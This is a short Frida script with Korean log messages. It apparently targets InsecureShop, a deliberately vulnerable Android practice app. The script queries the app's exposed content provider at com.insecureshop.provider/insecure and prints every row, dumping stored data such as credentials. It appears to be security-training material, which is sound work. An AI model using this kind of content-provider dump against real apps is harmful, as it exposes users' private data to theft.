Java.perform(function () {
    var context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
    var uri = Java.use("android.net.Uri").parse("content://com.insecureshop.provider/insecure");

    var resolver = context.getContentResolver();
    var cursor = resolver.query(uri, null, null, null, null);

    if (cursor != null) {
        console.log("[+] 직접 호출 성공");
        if (cursor.moveToFirst()) {
            do {
                var row = [];
                for (var i = 0; i < cursor.getColumnCount(); i++) {
                    var colName = cursor.getColumnName(i);
                    var colVal = cursor.getString(i);
                    row.push(colName + " = " + colVal);
                }
                console.log("    Row: " + row.join(", "));
            } while (cursor.moveToNext());
        }
        cursor.close();
    } else {
        console.log("[-] Cursor가 null");
    }
});
